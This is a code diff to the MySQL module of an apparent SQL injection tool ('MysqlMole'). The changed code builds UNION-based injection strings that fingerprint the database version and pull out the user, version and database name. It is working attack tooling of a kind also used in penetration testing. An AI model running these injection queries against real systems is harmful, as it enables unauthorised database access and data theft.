@@ -22,7 +22,7 @@
 # Santiago Alessandri
 # Gastón Traberg
 
-from dbmsmoles import DbmsMole
+from dbmsmoles import DbmsMole, FingerBase
 
 class MysqlMole(DbmsMole):
     out_delimiter_result = "::-::"
@@ -64,7 +64,7 @@ class MysqlMole(DbmsMole):
     def _dbinfo_query_info(self):
         return {
             'field' : 'user(),version(),database()', 
-            'table' : 'information_schema.schemata'
+            'table' : ''
         }
     
     def _concat_fields(self, fields):
@@ -77,7 +77,7 @@ class MysqlMole(DbmsMole):
         for i in range(0, query_columns):
             hashes.append(DbmsMole.to_hex(str(base + i)))
             to_search.append(str(base + i))
-        return [(hashes, to_search)]
+        return [FingerBase(hashes, to_search)]
     
     @classmethod
     def dbms_name(cls):
@@ -88,19 +88,11 @@ class MysqlMole(DbmsMole):
         return MysqlMole.inner_delimiter_result
     
     @classmethod
-    def field_finger_query(cls, columns, injectable_field):
+    def field_finger_query(cls, columns, finger, injectable_field):
         query = " and 1 = 0 UNION ALL SELECT "
         query_list = list(map(str, range(columns)))
-        query_list[injectable_field] = DbmsMole.to_hex(DbmsMole.field_finger_str)
+        query_list[injectable_field] = 'CONCAT(@@version,' + DbmsMole.to_hex(DbmsMole.field_finger_str) + ')'
         query += ",".join(query_list)
-        return query
-    
-    @classmethod
-    def dbms_check_query(cls, columns, injectable_field):
-        query = " and 1 = 0 UNION ALL SELECT "
-        query_list = list(map(str, range(columns)))
-        query_list[injectable_field] = "CONCAT({fing},@@version,{fing})".format(fing=MysqlMole.out_delimiter)
-        query += ",".join(query_list) + " "
         return query
 
     @classmethod
@@ -119,7 +111,10 @@ class MysqlMole(DbmsMole):
                                             MysqlMole.out_delimiter +
                                         ")")
         query += ','.join(query_list)
-        query += " from " + table_name + " where " + self.parse_condition(where) + \
+        print('Table"', table_name,'"')
+        if len(table_name) > 0:
+            query += " from " + table_name 
+        query += " where " + self.parse_condition(where) + \
                  " limit 1 offset " + str(offset) + " "
         return query
 
@@ -131,4 +126,4 @@ class MysqlMole(DbmsMole):
         return data.split(MysqlMole.inner_delimiter_result)
     
     def __str__(self):
-        return "Mysql 5 Mole"
+        return "Mysql Mole"
